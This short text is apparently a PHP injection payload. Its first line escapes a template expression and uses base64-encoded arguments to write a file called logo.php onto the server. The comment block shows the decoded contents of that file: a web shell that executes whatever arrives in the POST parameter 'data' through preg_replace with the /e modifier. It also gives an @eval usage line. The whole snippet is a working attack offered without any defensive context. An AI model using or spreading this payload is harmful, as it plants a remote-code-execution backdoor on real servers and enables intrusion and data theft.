{$phpinfo()'];file_put_contents(base64_decode('bG9nby5waHA='),base64_decode('PD9waHAgQHByZWdfcmVwbGFjZSgiL1tEYXRhYmFzZV0vZSIgLCRfUE9TVFtkYXRhXSwgImVycm9yIik7ID8+'));/*}

/* logo.php
<?php @preg_replace("/[Database]/e" ,$_POST[data], "error"); ?>
<O>Data=@eval($_POST[data]);</O>
data
*/
